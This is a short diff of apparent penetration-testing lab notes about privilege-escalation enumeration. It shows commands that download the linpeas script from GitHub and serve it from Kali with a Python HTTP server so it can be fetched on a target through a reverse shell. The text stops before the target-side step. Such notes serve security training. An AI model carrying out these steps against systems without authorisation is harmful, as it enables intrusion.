@@ -489,7 +489,7 @@ examadmin@midexam:~$
 
 ---
 
-
+## Random
 
 
 But in a real scenario without hints, the typical privesc enumeration order would be:
@@ -523,10 +523,10 @@ First you need to get the script onto the target. A few ways:
 Option 1 — host it from Kali and wget/curl it on the target:
 
 On Kali:
-# download linpeas if you don't have it
+download linpeas if you don't have it
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
 
-# host it
+host it
 python3 -m http.server 8080
 
 On the target (via your reverse shell):
